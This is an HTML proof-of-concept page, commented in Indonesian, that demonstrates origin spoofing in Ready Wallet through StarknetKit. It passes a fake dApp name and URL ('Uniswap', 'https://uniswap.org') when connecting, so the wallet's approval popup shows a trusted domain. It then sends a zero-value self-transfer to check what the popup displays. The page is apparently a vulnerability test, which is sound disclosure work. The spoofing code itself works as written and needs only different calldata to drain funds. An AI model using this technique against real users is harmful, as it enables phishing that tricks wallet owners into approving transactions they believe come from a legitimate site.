<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Ready Wallet Origin Spoof PoC</title>
</head>
<body>
  <h1>Ready Wallet Origin Spoof PoC</h1>
  <button id="connect">Connect + Send Transaction</button>
  <pre id="log"></pre>

  <script type="module">
    import { connect } from 'https://esm.sh/starknetkit@latest';

    const REAL_ORIGIN = location.origin;
    const log = (msg) => document.getElementById('log').textContent += msg + '\n';

    document.getElementById('connect').onclick = async () => {
      try {
        log('Connecting...');
        log('Real origin: ' + REAL_ORIGIN);

        // Connect ke Ready Wallet via StarknetKit
        const connection = await connect({
          webWalletUrl: 'https://web.ready.co',
          argentMobileOptions: {
            dappName: 'Uniswap',          // nama palsu
            url: 'https://uniswap.org',   // domain palsu
          }
        });

        if (!connection || !connection.isConnected) {
          log('Not connected!');
          return;
        }

        log('Connected!');
        log('Account: ' + connection.selectedAddress);
        log('');
        log('Sending transaction...');
        log('Cek domain di popup Ready Wallet!');

        // Kirim transaksi
        const tx = await connection.account.execute({
          contractAddress: '0x049d36570d4e46f48e99674bd3fcc84644ddd6b96f7c741b1562b82f9e004dc7',
          entrypoint: 'transfer',
          calldata: [
            connection.selectedAddress,
            '0x0',
            '0x0'
          ]
        });

        log('TX Hash: ' + tx.transaction_hash);
        log('');
        log('Domain tampil di popup = Uniswap/uniswap.org?');
        log('Real domain            = ' + REAL_ORIGIN);

      } catch(e) {
        log('Error: ' + e.message);
      }
    };
  </script>
</body>
</html>
